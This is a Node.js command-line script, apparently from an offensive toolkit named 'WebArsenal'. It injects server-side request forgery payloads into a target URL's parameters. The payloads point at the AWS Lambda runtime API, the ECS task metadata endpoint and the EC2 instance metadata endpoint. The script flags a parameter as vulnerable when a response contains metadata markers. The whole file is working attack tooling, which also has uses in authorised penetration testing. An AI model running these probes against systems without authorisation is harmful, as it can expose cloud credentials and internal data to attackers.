#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: lambda-metadata-hunter.js                          ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');

program
  .name('lambda-metadata-hunter.js')
  .description('Tests for AWS Lambda metadata URLs and potential info leaks.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL with parameters (e.g. https://example.com/api?url=test)')
  .option('-p, --param <name>', 'Specific parameter to fuzz')
  .parse(process.argv);

const opts = program.opts();

const LAMBDA_PAYLOADS = [
  "http://127.0.0.1:9001/2018-06-01/runtime/invocation/next", // Lambda Runtime Proxy
  "http://localhost:9001/2018-06-01/runtime/invocation/next",
  "http://169.254.170.2/v2/metadata", // ECS/Fargate Metadata
  "http://169.254.169.254/latest/meta-data/" // EC2 Metadata (sometimes reachable from Lambda)
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'lambda-metadata-hunter.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const targetUrl = new URL(opts.url);
  const params = opts.param ? [opts.param] : Array.from(targetUrl.searchParams.keys());
  
  if (params.length === 0) {
    console.log(chalk.yellow('[!] No parameters found. Use -u <url?file=test>'));
    return;
  }
  
  for (const param of params) {
    console.log(chalk.cyan(`[*] Fuzzing [Lambda Metadata] for: ${param}`));
    for (const payload of LAMBDA_PAYLOADS) {
      const testUrl = new URL(targetUrl.href);
      testUrl.searchParams.set(param, payload);
      
      try {
        const res = await axios.get(testUrl.href, { timeout: 5000, validateStatus: () => true });
        const body = String(res.data);
        
        if (body.includes('Lambda-Runtime-Aws-Request-Id') || body.includes('instance-id') || body.includes('metadata')) {
           console.log(chalk.bold.red(`\n[!] LAMBDA METADATA VULNERABILITY DETECTED! [${param}]`));
           console.log(chalk.red(`    Payload: ${payload}`));
           console.log(chalk.red(`    URL: ${testUrl.href}\n`));
           break;
        }
      } catch (e) {}
    }
  }
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
